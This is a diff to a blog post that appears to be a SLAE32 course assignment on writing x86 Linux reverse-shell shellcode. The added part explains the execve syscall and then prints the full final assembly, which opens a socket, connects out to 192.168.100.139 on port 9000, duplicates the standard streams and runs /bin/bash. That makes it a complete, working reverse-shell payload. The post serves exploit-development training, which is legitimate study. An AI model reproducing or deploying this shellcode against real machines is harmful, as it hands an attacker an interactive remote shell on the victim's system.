@@ -85,8 +85,8 @@ socklen_t addrlen);```. As you may see, the required flags are quite the same to
 + Chosen Port  (The chosen port will be pushed in hex as a word.)
 + AF_INET
 
-Furthermore, we have to satisfy the socklen_t addrlen argument as well. This requires the length of the previous struct, as like in the previous chapter, it was 16. This will be 
-reflected upon the value of DL
+Furthermore, we have to satisfy the socklen_t addrlen argument as well. This requires the length of the previous struct, as like in the previous chapter, it was 16 (any value 
+above this could be used as well) . This will be reflected upon the value of DL. 
 
 ```term
 connect:
@@ -99,7 +99,7 @@ connect:
       push word 0x2823        ; Pushes 9000 in hex as a WORD.
       push word 0x02          ; Pushes AF_INET into the stack.
       mov ecx, esp            ; Copies the value of ESP into ECX.
-      mov dl, 16              ; The value 16 is inserted into DL, as this argument requires the length of the struct.
+      mov dl, 30              ; The value 30 is inserted into DL. Anything above 16 can be used.
       int 0x80                ; Call to kernel.
 ```
 
@@ -124,6 +124,132 @@ dup2:
 
       jnz dup2                ; Jump if the zero flag (ZF) is not set, this will continue the loop 3 times.
 ```
+
+##### Execve
+
+###### Execute program
+
+Finally, the last syscall left to initialize is Execve, which will execute the program when the connection is stablished. 
+
+Syscall value:
+
+```term
+root@whitecr0wz:~# cat /usr/include/x86_64-linux-gnu/asm/unistd_32.h | grep execve 
+#define __NR_execve 11
+#define __NR_execveat 358
+root@whitecr0wz:~# 
+```
+
+manpage arguments:
+
+```term
+int execve(const char *pathname, char *const argv[], char *const envp[]);
+```
+
+The procedure with this syscall will be the following:
+
++ The program desired to execute will be /bin/bash. The string "////bin/bash" (additional slashes in order to be divisible by 4) will be pushed into the stack and then saved into EBX. Moreover, EDX will be set to 0 as the value envp[] is not required. Finally, EBX will be pushed and saved into ECX.
+
+```term
+execve:
+
+      xor eax, eax            ; Zeroes out EAX.
+      push eax                ; Pushes EAX (0x00000000).
+
+      PUSH 0x68736162         ; hsab
+      PUSH 0x2f6e6962         ; /nib
+      PUSH 0x2f2f2f2f         ; ////
+
+      mov ebx, esp            ; Copies the pushed instructions into EBX.
+      push eax                ; Pushes EAX (0x00000000).
+
+      mov edx, esp            ; Copies the value of ESP (0x00000000) into EDX, giving envp[] a value of 0.
+
+      push ebx                ; Pushes ////bin/bash into the stack.
+      mov ecx, esp            ; Copies such value to ECX.
+      push word 11            ; Pushes word 11 (execve) into the stack.
+      pop ax                  ; Pops such word into ax so there are no nulls.
+      int 0x80                ; Calls to kernel.
+```
+
+Let's test our shellcode.
+
+![](/assets/img/SLAE/SLAE32/Assignment_2/1.png)
+
+Wonderful!
+
+Final Code:
+
+```term
+global _start
+
+section .text
+
+_start:
+
+      xor eax, eax            ; Zeroes out EAX.
+      xor ebx, ebx            ; Zeroes out EBX.
+      xor ecx, ecx            ; Zeroes out ECX.
+      xor edx, edx            ; Zeroes out EDX.
+
+      push word 359           ; Pushes word 359 (socket) into the stack.
+      pop ax                  ; Pops such word into ax so there are no nulls.
+      mov bl, 2               ; Moves value 2 into bl, giving the value AF_INET.
+      mov cl, 1               ; Moves value 1 into bl, giving the value SOCK_STREAM.
+      push edx                ; There isn't anything really needed within this parameter, so 0 is pushed from EDX.
+      int 0x80                ; Call to kernel.
+      mov esi, eax            ; Saves the value of eax for sockfd values later on.
+
+connect:
+
+      push word 362           ; Pushes word 362 (connect) into the stack
+      pop ax                  ; Pops such word into ax so there are no nulls.
+      mov ebx, esi            ; Copies the value from ESI to EBX, granting EBX the sockfd value from the socket syscall.
+      push edx                ; Pushes 0.
+      push dword 0x8b64a8c0   ; Pushes 192.168.100.139 in hex as a DWORD.
+      push word 0x2823        ; Pushes 9000 in hex as a WORD.
+      push word 0x02          ; Pushes AF_INET into the stack.
+      mov ecx, esp            ; Copies the value of ESP into ECX.
+      mov dl, 30              ; The value 30 is inserted into DL, anything above 16 can be used.
+      int 0x80                ; Call to kernel.
+
+      xor ecx, ecx            ; Zeroes out ECX.
+      mov cl, 0x3             ; Starts counter for dup2.
+
+dup2:
+
+      xor eax, eax            ; Zeroes out EAX.
+
+      push word 63            ; Pushes word 63 (dup2) into the stack.
+      pop ax                  ; Pops such word into ax so there are no nulls.
+      mov ebx, esi            ; Copies the value from ESI to EBX, granting EBX the sockfd value from the socket syscall.
+      dec cl                  ; Decrements cl in order to set the zero flag (ZF)
+      int 0x80                ; Call to kernel.
+
+      jnz dup2                ; Jump if the zero flag (ZF) is not set, this will continue the loop 3 times.
+
+execve:
+
+      xor eax, eax            ; Zeroes out EAX.
+      push eax                ; Pushes EAX (0x00000000).
+
+      PUSH 0x68736162         ; hsab
+      PUSH 0x2f6e6962         ; /nib
+      PUSH 0x2f2f2f2f         ; ////
+
+      mov ebx, esp            ; Copies the pushed instructions into EBX.
+      push eax                ; Pushes EAX (0x00000000).
+
+      mov edx, esp            ; Copies the value of ESP (0x00000000) into EDX, giving envp[] a value of 0.
+
+      push ebx                ; Pushes ////bin/bash into the stack.
+      mov ecx, esp            ; Copies such value to ECX.
+      push word 11            ; Pushes word 11 (execve) into the stack.
+      pop ax                  ; Pops such word into ax so there are no nulls.
+      int 0x80                ; Calls to kernel.
+```
+
+#### The Wrapper
 
 
 
